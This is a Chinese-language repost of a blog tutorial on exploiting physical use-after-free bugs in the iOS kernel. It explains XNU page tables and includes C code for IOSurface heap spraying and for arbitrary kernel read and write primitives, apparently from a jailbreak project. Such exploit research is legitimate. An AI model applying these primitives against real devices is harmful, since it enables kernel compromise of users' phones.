#  编写 iOS 内核漏洞利用的分步指南   
 Ots安全   2024-09-25 15:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**介绍**  
  
iOS 漏洞利用一直让我着迷，但特别复杂的内核漏洞利用一直是我最感兴趣的。由于过去几年内核漏洞利用变得更加困难，发布的传统漏洞利用 (例如利用虚拟内存损坏漏洞的漏洞利用) 已经减少。然而，尽管如此，felix-pb还是以kfd的名义发布了三个漏洞利用。它们于 2023 年夏季首次发布，是第一个在 iOS 15.6 及更高版本上运行的公开内核漏洞利用。在开发我的 iOS 14 越狱 Apex 时，我为 Physpuppet 漏洞实现了一个自定义漏洞利用，在这篇博文中，我将解释在现代 iOS 上利用这种类型的漏洞有多么容易，这种类型的漏洞被称为“物理释放后使用”。  
  
我绝不是说内核利用很容易——我要说的是，物理释放后使用已被证明是极其强大的漏洞，几乎完全不受最近部署到 XNU 的缓解措施的影响。利用这些漏洞的策略不仅易于编写，而且易于理解。因此，让我们开始解释什么是物理释放后使用。  
  
旁注：我当然不是一个人做到的。如果没有@staturnz的帮助，我不可能编写这个漏洞，他还为 iOS 12 和 iOS 13 的 PhysPuppet 编写了一个漏洞。在我们开始之前，这个漏洞的源代码可以在这里找到。  
  
**XNU中的内存管理**  
  
XNU 是 macOS、iOS、watchOS 以及近三十年来几乎所有 Apple 操作系统的内核，其内存管理方式与大多数其他操作系统类似。在 XNU 中，有两种类型的内存 -物理内存和虚拟内存。  
  
每个进程（甚至内核本身）都有一个虚拟内存映射。MachO 文件（可执行文件的 Darwin 版本）将为二进制文件的每个段定义一个基址 - 例如，如果 MachO 指定基址为 0x1000050000，则分配给该进程的内存似乎从 0x1000050000 开始并继续向前。显然，这对于系统使用的实际物理内存来说是不可行的。如果两个进程请求相同的基址，或者它们的内存映射重叠，则会立即导致问题。  
  
物理内存起始于 0x800000000 区域内的地址。虚拟内存对于进程而言是连续的，这意味着它是单个内存映射，其中每个页面都是连续映射的。注意：在大多数操作系统中，内存被划分为大小相等的“页面”。对于 iOS，页面大小通常为 16KB，在较旧的设备（例如配备 A8 的设备）上为 4KB。为简单起见，本说明将假设页面大小为 16KB，即 0x4000 字节。  
  
为了演示虚拟内存的工作原理，假设您有三页虚拟内存：  
- 第 1 页 @ 0x1000050000  
  
- 第 2 页 @ 0x1000054000  
  
- 第 3 页 @ 0x1000058000  
  
现在，您可以简单地使用memcpy()并复制 0xC000 字节，覆盖所有三个页面，您不会注意到任何事情。实际上，这些页面可能位于完全不同的地址。例如：  
- 第 1 页 @ 0x800004000  
  
- 第 2 页 @ 0x80018C000  
  
- 第 3 页 @ 0x8000C4000  
  
如您所见，通过使用虚拟内存，您可以安抚需要连续内存映射和预定义基地址的进程。当进程取消引用指向虚拟内存地址的指针时，该地址将被转换为物理地址，然后读取或写入。但是这是如何转换的呢？  
  
**页表**  
  
顾名思义，页表（也称为转换表）是存储有关进程可用的内存页面的信息的表。对于 iOS 上的常规用户空间进程，虚拟内存地址空间从 0x0 到 0x8000000000。当您尝试引用指针 0x1000000000 时，内核将需要查找此地址的相应物理页面。这就是页表的作用所在。  
  
说到底，页表只是 64 位地址的列表。在 iOS 中，有三级页表。一级页表覆盖 0x1000000000 字节虚拟内存；二级页表覆盖 0x2000000 字节虚拟内存；三级页表覆盖 0x4000 字节内存（仅为一页）。  
  
页表中的每个条目可以是块映射（仅将该内存区域分配给大小相同的连续物理内存区域），也可以是指向子页表的指针（N 级表将具有 N+1 级子表）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacflCtgZGRovRhZKnnPrxicBtdUEODK5hGTM812ia5ic6mGrlPffHBmcknTkJ5yeD5iadx2AH9kADJBibw/640?wx_fmt=png&from=appmsg "")  
  
因此，如果您将物理地址 0x800004000（以及一些其他标志）写入 2 级页表的第一个索引，则意味着虚拟地址 0x1000000000 -> 0x1002000000 将映射到物理地址 0x800004000 -> 0x802004000。但是，如果页表条目是 3 级页表的地址，则意味着 0x1000000000 和 0x1002000000 之间的每个内存页面都由 3 级页表中的每个条目单独分配。  
  
**物理释放后使用**  
  
如果您仍在阅读本文，并且对页表的解释并不感到厌烦，那么您应该可以顺利阅读本博文的其余部分。了解页表是理解导致物理释放后使用问题的根本原因的关键。  
  
本质上，物理上的释放后使用是这样的：  
- 用户进程分配一些虚拟内存为可读和可写  
  
- 页表被更新，以映射到相应的物理地址，可供进程读写  
  
- 该进程从用户空间释放内存  
  
- 由于错误，内核不会从页表中删除映射  
  
- 但是，内核认为相应的物理页面可以自由使用（它将页面的地址添加到全局的“空闲页面列表”中）  
  
- 因此，进程可以读取和写入一些页面，这些页面可以被内核重用为内核内存  
  
作为攻击者，这给我们带来了什么？假设内核决定将释放的 N 个页面重新分配为内核内存，我们现在可以从用户空间读取和写入 N 个随机内核内存页面。这是一个非常强大的原语，因为如果在我们仍然可以访问的其中一个页面上分配了一个重要的内核对象，我们可以覆盖值并根据我们的喜好对其进行操作。  
  
**开发策略**  
  
虽然我不会深入讨论每个漏洞的细节（它们非常复杂，你可以在这里阅读原始文章），但假设每个“触发器”都会导致未知数量的内核页面上发生物理使用后释放。  
  
我们面临的最大问题是，我们无法选择或预测哪些页面会被内核重新分配。此外，我们也无法选择内核会重新分配多少页面。我们被赋予了一定数量的页面，每个页面位于一个随机地址，内核可能会使用这些页面。从这里开始，最好的办法就是所谓的“堆喷射”。  
  
**堆喷射**  
  
鉴于初始原语的性质，只有一种方法可以可靠地将其转变为更强大的原语。顾名思义，就是用大量相同的对象“喷洒”内核内存，直到其中一个对象落在我们可以写入的内存页面上。  
  
IOSurface 技术最初由opa334为 kfd 改编，最初用于weightBufs内核漏洞利用，正是如此。整个堆喷射过程应该是这样的：  
- 分配大量 IOSurface 对象（它们分配在内核内存中）  
  
- 分配每个字段时，为其中一个字段分配一个“魔法”值，以便我们能够识别它  
  
- 扫描我们的免费页面，获取这一神奇价值  
  
- 当我们在一个我们控制的释放页面上找到 IOSurface 时，我们就成功了！  
  
```
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
    if (*nClients >= 0x4000) return;
    for (int i = 0; i < nSurfaces; i++) {
        fast_create_args_t args;
        lock_result_t result;
        
        size_t size = IOSurfaceLockResultSize;
        args.address = 0;
        args.alloc_size = *nClients + 1;
        args.pixel_format = IOSURFACE_MAGIC;
        
        IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
        io_connect_t id = result.surface_id;
        
        (*clients)[*nClients] = id;
        *nClients = (*nClients) += 1;
    }
}
```  
  
  
如你所见，IOSURFACE_MAGIC是我们可以搜索的魔法值，并且我们只需nSurfaces用这个魔法值分配 IOSurfaces 的数量。  
  
然后通过反复调用这个函数，你可以很容易地获得一个好的内核读/写原语：  
  
```
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
    io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
    int nSurfaceIDs = 0;
    
    for (int i = 0; i < 0x400; i++) {
        spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);
        
        for (int j = 0; j < nPages; j++) {
            uint64_t start = puafPages[j];
            uint64_t stop = start + (pages(1) / 16);
            
            for (uint64_t k = start; k < stop; k += 8) {
                if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
                    info.object = k;
                    info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
                    if (self_task) *self_task = iosurface_get_receiver(k);
                    goto sprayDone;
                }
            }
        }
    }
    
sprayDone:
    for (int i = 0; i < nSurfaceIDs; i++) {
        if (surfaceIDs[i] == info.surface) continue;
        iosurface_release(client, surfaceIDs[i]);
    }
    free(surfaceIDs);
    
    return 0;
}
```  
  
  
我们不断循环喷射 IOSurface 对象，直到在某个已释放的物理页面上找到这些对象。找到后，我们将保存该对象的地址和 ID 以供日后使用，并读取receiverIOSurface 对象的字段以检索任务结构地址。  
  
**内核内存读/写**  
  
此时，我们在内核内存中有一个 IOSurface 对象，我们可以从用户空间读取和写入该对象，因为它所在的物理页面也映射到我们的进程中。但是我们如何使用它来获取内核读/写原语呢？  
  
IOSurface 对象有两个有用的字段。第一个是指向对象的 32 位使用计数的指针，第二个是指向 64 位“索引时间戳”的指针。通过调用方法获取使用计数并设置索引时间戳，同时覆盖指向这些值的指针，我们可以实现任意 32 位内核读取和任意 64 位内核写入。  
  
对于读取，我们覆盖使用计数指针（占读取中的 0x14 字节偏移量），然后调用方法来读取使用计数。  
  
```
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
    uint64_t args[1] = {surfaceID};
    uint32_t size = 1;
    uint64_t out = 0;
    IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
    return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
    uint64_t orig = iosurface_get_use_count_pointer(info.object);
    iosurface_set_use_count_pointer(info.object, addr - 0x14); // Read is offset by 0x14
    uint32_t value = get_use_count(info.client, info.surface);
    iosurface_set_use_count_pointer(info.object, orig);
    return value;
}
```  
  
  
对于写入，我们覆盖索引时间戳指针，然后调用方法来设置索引时间戳。  
  
```
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
    uint64_t args[3] = {surfaceID, 0, value};
    IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
    uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
    iosurface_set_indexed_timestamp_pointer(info.object, addr);
    set_indexed_timestamp(info.client, info.surface, value);
    iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```  
  
  
这样，我们就有了（相当）稳定的内核内存读写原语，内核漏洞利用就完成了！32 位读取可以发展为任意大小的读取（通过多次读取或将 32 位值转换为位数较少的值），64 位写入也是如此（通过读取 64 位值，更改 X 位，然后写回该值）。  
  
简单回顾一下，整个漏洞利用流程如下：  
- 触发物理使用后释放以获取任意数量的释放页面  
  
- 在内核内存中分配大量包含魔法值的 IOSurface 对象  
  
- 等待 IOSurface 对象到达你可以写入的空闲页面之一  
  
- 滥用物理的释放后使用来更改 IOSurface 对象中的指针，从而允许你调用使用这些指针执行任意读写的 IOSurface 方法  
  
**结论**  
  
在这篇博文中，我展示了即使在较新的 iOS 版本中，物理使用后释放也是相当容易利用的内核漏洞。IOSurface 技术一直工作到 iOS 16，其中某些可用于内核读写的字段针对 arm64e 设备进行了 PAC，此外还有其他底层更改也破坏了 arm64 设备上的写入原语。  
  
提醒一下，此漏洞的源代码可在此处获得。将来，我将发布另一篇博客文章，详细介绍使用此漏洞的开源 iOS 14 越狱 Apex 的开发过程。现在，我希望你喜欢这篇文章，但如果你有任何疑问或顾虑，请随时给我发电子邮件alfie@alfiecg.uk 。  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
